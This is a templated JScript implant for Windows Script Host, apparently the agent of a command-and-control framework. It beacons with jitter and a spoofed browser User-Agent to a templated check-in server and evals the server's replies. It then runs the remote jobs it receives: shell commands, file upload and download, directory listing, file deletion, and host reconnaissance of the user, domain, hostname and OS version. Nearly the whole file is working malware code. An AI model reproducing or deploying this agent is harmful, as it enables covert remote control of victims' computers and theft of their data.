var errors = 0;
var wscriptshell = new ActiveXObject("WScript.Shell");
var job_req = '[["{{ key }}"]]';
var check_in_job_id = '';
var sleep = {{ sleep }};
var jitter = {{ jitter }};
var delay = ((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000
var endpoints = {{ endpoints }};


function post(data){
  try {
    var winhttp = new ActiveXObject("WinHttp.WinHttpRequest.5.1");;
    winhttp.Open('Post', '{{ check_in_uri }}' + endpoints[Math.round(Math.random() * (endpoints.length - 1))] );
    winhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0");
    winhttp.setRequestHeader("X-Frame-Options", "SAMEORIGIN");
    winhttp.setRequestHeader("Content-Type", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
    winhttp.Send(data);
    winhttp.WaitForResponse();
    return winhttp;
  } catch (e) {
    errors = errors + 1;
    if(errors > 50){
      WScript.Quit(1);
    }
  }
}

{% include "functions/base64.js" %}
{% include "functions/delfile.js" %}
{% include "functions/dir.js" %}
{% include  "functions/download.js" %}
{% include "functions/upload.js" %}
{% include "functions/cmd.js" %}


while (true) {
  try {
      eval("json_object=" + post(job_req).responseText + ";");
  } catch (e) {
      job_req = '[["' + check_in_job_id + '"]]';;
      WScript.Sleep(((sleep - (sleep * jitter)) + Math.random() * ((sleep * jitter) * 2)) * 1000);
      continue;
  }
  try {
      job_req = '[';
      jobs = json_object.job_rep
      for (var job in jobs) {
          var id = jobs[job].id
          var name = jobs[job].name
          var args = jobs[job].arguments.toString().split(',');
          try {
              var results = '';
              if ('check_in' == name){
                  check_in_job_id = id;
                  break;
              }
              if ('upload' === name) {
                  results = upload(b64d(args[0], "bin"), b64d(args[1]));
              }
              if ('download' === name) {
                  results = download(b64d(args[0]));
              }
              if ('dir' === name) {
                  results = dir(b64d(args[0]));
              }
              if ('whoami' === name) {
                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
              }
              if ('tmp' === name) {
                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%"));
              }
              if ('hostname' === name) {
                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
              }
              if ('domain' === name) {
                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%"));
              }
              if ('os' === name) {
                  results = b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber"));
              }
              if ('cmd' === name) {
                  results = cmd(b64d(args[0]));
              }
              if ('delfile' === name) {
                  results = delfile(b64d(args[0]));
              }
              if ('get delay' === name) {
                  delay = ((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000
                  results = b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + ' %');
              }
              if('set jitter' === name){
                  jitter = b64d(args[0]);
                  results = b64e('Changed jitter to ' + jitter + ' %');
              }
              if('set sleep' === name){
                  sleep = b64d(args[0]);
                  results = b64e('Changed sleep to ' + sleep + ' second(s)');
              }
              job_req = job_req + '["' + id + '","' +  results + '"],';
          } catch (e) {
             job_req = job_req + '["' + id + '","' + b64e("Job failed: " + e.message) + '"],';
          }
      }
  } catch (e) {
      // caught for reliability
  }
  job_req = job_req + '["' + check_in_job_id + '"]]';
  WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
}